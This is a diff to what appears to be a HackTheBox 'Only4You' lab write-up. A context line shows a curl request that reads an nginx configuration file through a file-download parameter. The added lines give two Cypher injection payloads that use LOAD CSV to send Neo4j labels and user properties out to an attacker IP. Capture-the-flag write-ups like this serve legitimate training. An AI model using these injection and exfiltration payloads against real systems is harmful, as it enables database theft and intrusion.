@@ -205,3 +205,10 @@ you can use the curl traffic to intercept
 ```
 curl --proxy localhost:8080 -s -X POST http://beta.only4you.htb/download -d "image=/etc/nginx/sites-enabled/default"
 ```
+
+### Neo4j enumeration
+
+```
+'OR 1=1 WITH 1 as a CALL db.labels() yield label LOAD CSV FROM 'http://10.10.16.47/?label='+label as l RETURN 0 as _0 //
+' OR 1=1 WITH 1 as a MATCH (f:user) UNWIND keys(f) as p LOAD CSV FROM 'http://10.10.16.47/?' + p +'='+toString(f[p]) as l RETURN 0 as _0 //
+```
